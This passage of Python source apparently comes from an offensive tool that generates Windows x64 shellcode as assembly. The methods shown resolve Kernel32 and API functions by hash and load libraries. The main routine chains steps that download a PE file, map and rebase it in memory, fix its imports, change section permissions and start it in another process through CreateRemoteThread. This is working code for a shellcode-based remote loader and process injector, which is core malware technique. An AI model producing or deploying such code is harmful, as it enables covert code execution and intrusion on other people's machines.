    add rax, rdi
error:
    leave
    ret
        """

        return stub

    def load_library(self, lib):
        """Generates the stub to load a library not currently loaded into a process
        """

        lists = convert.from_str_to_xwords(lib)
        write_index = self.storage_offsets['functionName']

        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))

        for i in range(len(lists["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], rcx\n".format(hex(write_index))
            write_index -= 8

        for i in range(len(lists["DWORD_LIST"])):
            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
            src += "    mov [rbp-{}], ecx\n".format(hex(write_index))
            write_index -= 4

        for i in range(len(lists["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
            src += "    mov [rbp-{}], cx\n".format(hex(write_index))
            write_index -= 2

        for i in range(len(lists["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
            src += "    mov [rbp-{}], cl\n".format(hex(write_index))
            write_index -= 1

        src += f"""
    xor rcx, rcx
    mov [rbp-{write_index}], cl
    lea rcx, [rbp - {self.storage_offsets['functionName']}]
    mov rax, [rbp - {self.storage_offsets['LoadLibraryA']}]
    call rax
        """

        return src

    def resolve_functions(self):
        """This function is responsible for loading all libraries and resolving respective functions
        """

        stub = ""
        for lib, imports in self.dependencies.items():
            if (lib != "Kernel32.dll"):
                stub += self.load_library(lib)
                stub += """
    mov rdi, rax
                """

            for func in range(len(imports)):
                stub += f"""
get_{imports[func]}:
    mov rdx, {convert.from_str_to_win_hash(imports[func])}
    call lookupFunction
    mov [rbp - {self.storage_offsets[imports[func]]}], rax
                """

        return stub

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        shellcode = f"""
_start:
    push rbp
    mov rbp, rsp
    sub rsp, {self.stack_space}

    call getKernel32
    mov rdi, rax
        """

        shellcode += self.resolve_functions()

        shellcode += self.download_pe()

        shellcode += self.alloc_image_space()

        shellcode += self.rebase_pe()

        shellcode += self.load_imports()

        shellcode += self.write_headers()

        shellcode += self.modify_section_perms()

        shellcode += f"""
call_CreateRemoteThread:
    xor r9, r9
    mov r8, [rbp - {self.storage_offsets['pNtHeader']}]
    add r8, {winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset}
    mov r9d, [r8 + {winnt._IMAGE_OPTIONAL_HEADER64.AddressOfEntryPoint.offset}]

    mov rcx, [rbp - {self.storage_offsets['lpvLoadedAddress']}]
    add rcx, r9
    mov r9, rcx
    xor rdx, rdx
    mov [rsp + 0x20], rdx
    mov [rsp + 0x28], rdx
    mov [rsp + 0x30], rdx
    xor r8, r8
    mov rax, [rbp - {self.storage_offsets['CreateRemoteThread']}]
    mov rcx, [rbp - {self.storage_offsets['hProcess']}]
    call rax

call_WaitForSingleObject:
    mov rcx, rax
    xor rdx, rdx
    dec rdx
    mov rax, [rbp - {self.storage_offsets['WaitForSingleObject']}]
    call rax
    ret
        """

        shellcode += self.get_kernel32()

        shellcode += self.lookup_function()

        shellcode += self.rva_to_offset()

        return shellcode

    def get_shellcode(self):
        """Generates shellcode
        """

        generator = Assembler(Shellcode.arch)

        src = self.generate_source()

        return generator.get_bytes_from_asm(src)
